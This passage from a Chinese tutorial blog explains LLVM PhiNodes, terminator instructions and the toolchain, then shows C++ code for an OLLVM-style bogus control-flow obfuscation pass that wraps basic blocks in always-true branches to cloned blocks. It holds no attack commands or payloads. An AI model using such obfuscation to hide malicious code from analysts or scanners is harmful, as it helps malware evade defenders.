&lt;p>LLVM的指令类型中包含一种特殊节点叫 PhiNode，PhiNode 的存在是为了解决 LLVM IR 中因 SSA （静态单次赋值）引起的条件初始化问题。示例如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="nf">foooooo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">bar&lt;/span>&lt;span class="p">){&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bar&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//BasicBlock 1
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//BasicBlock 2
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到我们需要按 &lt;code>bar&lt;/code> 的取值来初始化 &lt;code>i&lt;/code>，但 SSA 要求 &lt;code>i&lt;/code> 只能被赋值一次。PhiNode 允许根据基本块选择赋值。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="nf">foooooo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">bar&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bar&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;span class="c1">//BasicBlock1
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="c1">//BasicBlock2
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Phi&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">BasicBlock1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],[&lt;/span>&lt;span class="n">BasicBlock2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面的例子也可以改成在栈或堆上开辟空间，以类似指针的方式避开 SSA 约束。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="nf">foooooo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">bar&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bar&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;span class="n">Store&lt;/span> &lt;span class="n">Value&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">memory&lt;/span> &lt;span class="n">location&lt;/span> &lt;span class="n">pointed&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">by&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="n">Store&lt;/span> &lt;span class="n">Value&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">memory&lt;/span> &lt;span class="n">location&lt;/span> &lt;span class="n">pointed&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">by&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">load&lt;/span> &lt;span class="n">from&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">address&lt;/span> &lt;span class="n">pointed&lt;/span> &lt;span class="n">by&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">j&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="terminator">Terminator:&lt;/h4>
&lt;p>参考文章：&lt;a class="link" href="https://www.quora.com/How-do-Terminators-work-in-the-LLVM-IR" target="_blank" rel="noopener"
>How do Terminator work in LLVM IR&lt;/a>&lt;/p>
&lt;p>LLVM中，一个基本块 &lt;em>BasicBlock&lt;/em> 总是以终结指令 &lt;em>TerminatorInst&lt;/em> 结束的。终结指令不能出现在基本块末尾以外的任何地方。粗略地说，终结指令标识控制流在基本块结束后去往何方。&lt;/p>
&lt;p>每个终结指令都包含一定的后继基本块。&lt;/p>
&lt;p>几个常见的终结指令类型：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>ReturnInst&lt;/code> 就像是普通编程中的的&lt;code>return&lt;/code>语句。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BranchInst&lt;/code> 是跳转指令，包括两类：&lt;/p>
&lt;ul>
&lt;li>条件跳转，满足条件时跳转分支1，否则跳转分支2。&lt;/li>
&lt;li>非条件跳转，总是跳转到某个分支。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SwitchInst&lt;/code> 类似于普通编程里的 &lt;code>switch&lt;/code> 语句，可以包含更多的后继块。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>还有些不那么常见的终结指令：&lt;/p>
&lt;ul>
&lt;li>&lt;code>invoke&lt;/code> 和 &lt;code>catchswitch&lt;/code>&lt;/li>
&lt;li>&lt;code>unreachable&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="33-工具链">3.3 工具链&lt;/h3>
&lt;p>参考文章：&lt;a class="link" href="https://llvm.org/docs/CommandGuide/index.html" target="_blank" rel="noopener"
>LLVM Command Guide&lt;/a>&lt;/p>
&lt;p>实际动手前先了解下 LLVM工具链，列出一些会涉及到的命令行工具。&lt;/p>
&lt;ul>
&lt;li>&lt;code>llc&lt;/code> 将输入的 LLVM IR(&lt;code>.ll&lt;/code>) 编译成指定架构的汇编（或二进制对象文件）&lt;/li>
&lt;li>&lt;code>lli&lt;/code> 将输入的 BitCode(&lt;code>.bc&lt;/code>) 解释执行。&lt;/li>
&lt;li>&lt;code>llvm-as&lt;/code> 汇编器&lt;/li>
&lt;li>&lt;code>llvm-dis&lt;/code> 反汇编器，可以反汇编 BitCode&lt;/li>
&lt;li>&lt;code>opt&lt;/code> BITCODE/IR 优化器&lt;/li>
&lt;/ul>
&lt;p>最好再安装一个 graphviz，因为很多编程语言的命令行工具如果提供图形输出的话，大多是以 dot 形式提供（比如 go 的 pprof 和 LLVM opt 的 dot-cfg）。&lt;/p>
&lt;h3 id="33-runonfunction">3.3 runOnFunction&lt;/h3>
&lt;p>参考 OLLVM 的代码，抄出过滤函数。原理不明暂且不深究。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="kt">bool&lt;/span> &lt;span class="nf">isObfuscateable&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">Function&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">isDeclaration&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">hasAvailableExternallyLinkage&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">isInvoke&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fn&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">bool&lt;/span> &lt;span class="nf">isInvoke&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">Function&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nl">bb&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">isa&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">InvokeInst&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getTerminator&lt;/span>&lt;span class="p">()))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后在入口点简单过滤掉不能混淆的函数，接着遍历基本块，对每个基本块都进行一次混淆。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="kt">bool&lt;/span> &lt;span class="nf">runOnFunction&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Function&lt;/span>&lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">F&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">isObfuscateable&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">errs&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="s">&amp;#34;function &amp;#34;&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getName&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="s">&amp;#34; is not obfuscateable&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">list&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&amp;gt;&lt;/span> &lt;span class="n">blocks&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nl">block&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">F&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">blocks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">block&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nl">block&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">blocks&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 原始块分割为三个基本块：entry、original、terminator
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 通过两个恒真条件连接
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">entryBB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">block&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">originalBB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">entryBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">splitBasicBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entryBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getFirstNonPHIOrDbgOrLifetime&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;original&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">terminatorBB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">originalBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">splitBasicBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="n">originalBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">end&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;terminator&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="c1">// 构造伪造块
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 这一步已经构造好了 altered 跳转 original
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">alteredBB&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">createAlteredBB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">originalBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">F&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 清理 terminator，重新构造跳转关系
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">entryBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getTerminator&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">eraseFromParent&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">originalBB&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getTerminator&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">eraseFromParent&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// 构造恒真条件，从 entry 跳转到 original
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">lhs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ConstantInt&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">getInt32Ty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getContext&lt;/span>&lt;span class="p">()),&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">rhs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ConstantInt&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">getInt32Ty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getContext&lt;/span>&lt;span class="p">()),&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">condition&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ICmpInst&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">entryBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_EQ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lhs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">rhs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;condition&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="n">BranchInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">originalBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">condition&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">entryBB&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 构造恒真条件，从 original 跳转到 terminator
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">lhs2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ConstantInt&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">getInt32Ty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getContext&lt;/span>&lt;span class="p">()),&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">rhs2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ConstantInt&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">getInt32Ty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getContext&lt;/span>&lt;span class="p">()),&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">condition2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ICmpInst&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">originalBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ICmpInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">ICMP_EQ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lhs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">rhs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;condition2&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="n">BranchInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">terminatorBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">alteredBB&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">condition&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">originalBB&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>混淆过程非常简单，原始基本块分割成三个部分，清除&lt;code>entry&lt;/code>和&lt;code>original&lt;/code>的&lt;code>terminator&lt;/code>并加入恒真条件跳转，false 分支都指定为 &lt;code>altered&lt;/code> 即可。&lt;/p>
&lt;h3 id="34-createalteredbb">3.4 createAlteredBB&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">createAlteredBB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BasicBlock&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">original&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Function&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 构造伪造块
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">ValueToValueMapTy&lt;/span> &lt;span class="n">VMap&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">altered&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">CloneBasicBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">original&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">VMap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Twine&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;altered&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 修复伪造块的指令
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">originalInstIt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">original&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">begin&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nl">inst&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">altered&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// NOTE:
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 参考链接： https://bbs.pediy.com/thread-266201.htm
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// ... 但是CloneBasicBlock函数进行的克隆并不是完全的克隆，第一他不会对指令的操作数进行替换，比如：
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// ```
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// orig:
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// %a = ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// %b = fadd %a, ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// clone:
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// %a.clone = ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// %b.clone = fadd %a, ... ; Note that this references the old %a and
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// not %a.clone!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// ```
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 在clone出来的基本块中，fadd指令的操作数不是%a.clone，而是%a。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 所以之后要通过VMap对所有操作数进行映射，使其恢复正常：
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="n">opi&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">op_begin&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">opi&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">op_end&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">opi&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MapValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">opi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">VMap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RF_None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">opi&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 第二，它不会对PHI Node进行任何处理，PHI Node的前驱块仍然是原始基本块的前驱块，
